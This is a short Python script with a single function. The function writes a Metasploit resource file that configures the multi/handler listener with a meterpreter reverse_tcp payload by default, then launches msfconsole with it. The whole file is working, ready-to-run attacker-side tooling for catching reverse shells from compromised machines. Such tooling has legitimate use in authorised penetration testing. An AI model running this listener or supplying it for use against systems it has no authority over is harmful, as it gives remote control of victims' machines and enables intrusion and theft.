import subprocess
import os

def start_msf_listener(lhost: str, lport: int, payload_type: str = "python/meterpreter/reverse_tcp"):
    """
    Launches a Metasploit listener (multi/handler) for the given LHOST/LPORT and payload type.
    Requires msfconsole installed and in PATH.
    """
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""

    # Save resource file
    rc_file = "/tmp/msf_listener.rc"
    with open(rc_file, "w") as f:
        f.write(rc_content)

    print("[*] Starting Metasploit Framework listener...")
    print(f"[*] LHOST: {lhost}, LPORT: {lport}, PAYLOAD: {payload_type}")
    print("[*] Press Ctrl+C to stop Metasploit when done.")

    # Run msfconsole with the resource file
    try:
        subprocess.run(["msfconsole", "-r", rc_file])
    except FileNotFoundError:
        print("[!] msfconsole not found. Make sure Metasploit is installed and in your PATH.")
    except KeyboardInterrupt:
        print("\n[!] Listener stopped by user.")
